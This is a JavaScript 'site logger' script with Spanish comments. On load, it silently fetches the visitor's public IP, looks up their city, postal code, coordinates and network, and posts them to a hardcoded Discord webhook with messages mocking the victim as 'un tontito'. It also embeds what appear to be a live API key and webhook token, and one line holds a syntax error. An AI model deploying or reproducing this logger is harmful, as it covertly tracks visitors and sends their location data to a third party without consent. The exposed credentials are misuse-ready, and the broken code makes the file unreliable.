// Reemplaza los placeholders antes de usar:
// - const IPLOCATE_API_KEY = 'TU_API_KEY_AQUI'; // opcional (recomendado)
// - const DISCORD_WEBHOOK = 'TU_WEBHOOK_DE_DISCORD_AQUI'; // si lo vas a usar

const IPLOCATE_API_KEY = 'c91572a310cda49cb0e048c364b874d5'; // opcional, pon tu key aquí
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1435149039330136247/HGSYhy5w0hFUJGOuUVkMeYNaiF0E-5bWkv66haHafn5HSy6OqPgSr6hQPadPvu_SsMnh'; // reemplaza o elimina

const sendIP = async () => {
  try {
    // 1) Obtener la IP pública
    const ipRes = await fetch('https://api.ipify.org?format=json');
    if (!ipRes.ok) throw new Error('No se pudo obtener la IP pública');
    const ipJson = await ipRes.json();
    const ipadd = ipJson.ip;

    // 2) Consultar IPLocate para esa IP
    // Endpoint: https://iplocate.io/api/lookup/:ip  (puedes añadir ?apikey=KEY si tienes key)
    const keyQuery = IPLOCATE_API_KEY ? `?apikey=${encodeURIComponent(IPLOCATE_API_KEY)}` : '';
    const iplocateUrl = `https://iplocate.io/api/lookup/${encodeURIComponent(ipadd)}${keyQuery}`;

    const geoRes = await fetch(iplocateUrl);
    if (!geoRes.ok) throw new Error('Error consultando IPLocate');
    const geoData = await geoRes.json();

    // 3) Preparar el payload (ejemplo: embed para Discord)
    const payload = {
      username: "site logger",
      // avatar_url: "https://example.com/avatar.jpg",
      content: `ya cayo un tontito`,
      embeds: [
        {
          title: 'Un tontito mas',
          description: [
            `**IP Address >>** ${ipadd}`,
            `**Network / ASN >>** ${geoData.asn.name || 'N/A')}`,
            `**City >>** ${geoData.city || 'N/A'}`,
            `**Country >>** ${geoData.country || 'N/A'}`,
            `**Postal Code >>** ${geoData.postal_code || 'N/A'}`,
            `**Latitude >>** ${geoData.latitude ?? 'N/A'}`,
            `**Longitude >>** ${geoData.longitude ?? 'N/A'}`,
            `**Timezone >>** ${geoData.time_zone || 'N/A'}`,
            `**Satellite >>** ${geoData.is_satellite || 'N/A'}`,
            `**Route >>** ${geoData.asn.route || 'N/A'}`,
          ].join('\n'),
          color: 0x800080
        }
      ]
    };

    // 4) Enviar al webhook (si quieres; si no lo usarás, elimina esta sección)
    if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== 'YOUR_DISCORD_WEBHOOK_URL') {
      const dscRes = await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (dscRes.ok) {
        console.log('Sent! <3');
      } else {
        console.log('Failed to send to Discord: ', dscRes.status, await dscRes.text());
      }
    } else {
      // Si no hay webhook, solo imprimimos el resultado en consola (útil para probar)
      console.log('IP:', ipadd);
      console.log('Geo:', geoData);
    }
  } catch (err) {
    console.error('Error:', err);
  }
};

// Ejecutar
sendIP();
